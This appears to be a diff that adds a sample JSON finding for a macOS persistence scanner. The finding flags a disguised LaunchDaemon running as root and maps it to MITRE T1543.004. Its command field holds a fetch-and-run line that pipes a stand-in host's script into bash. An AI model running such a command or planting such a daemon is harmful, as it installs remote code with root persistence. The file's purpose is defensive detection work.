@@ -1,0 +1,30 @@
+{
+  "findings": [
+    {
+      "id": "sample-launchdaemon-critical",
+      "title": "LaunchDaemon: com.apple.software.update.helper",
+      "severity": "CRITICAL",
+      "category": "LaunchDaemon",
+      "mitre_technique_id": "T1543.004",
+      "mitre_technique_name": "Launch Daemon",
+      "path": "/Library/LaunchDaemons/com.apple.software.update.helper.plist",
+      "executable_path": "/Users/Shared/.cache/update",
+      "command": "/bin/bash -c curl https://example.invalid/install.sh | bash",
+      "user_context": "root",
+      "owner": "root",
+      "permissions": "-rw-r--r--",
+      "sha256": "",
+      "code_signature_status": "unsigned",
+      "notarization_status": "unknown",
+      "first_seen": "2026-06-13T00:00:00+00:00",
+      "last_seen": "2026-06-13T00:00:00+00:00",
+      "explanation": "This LaunchDaemon starts automatically as root when macOS boots. The referenced executable is unsigned and located in a user-writable directory, which increases the risk that it could be abused for persistence. Risk factors: runs from or references a commonly abused writable/user-controlled path; target executable is unsigned or has an invalid signature; command invokes a scripting/downloader utility or remote URL.",
+      "recommendation": "Validate the plist owner, command, signature, and business purpose before considering removal.",
+      "raw_evidence": {
+        "run_at_load": true,
+        "keep_alive": true,
+        "world_writable_plist": false
+      }
+    }
+  ]
+}
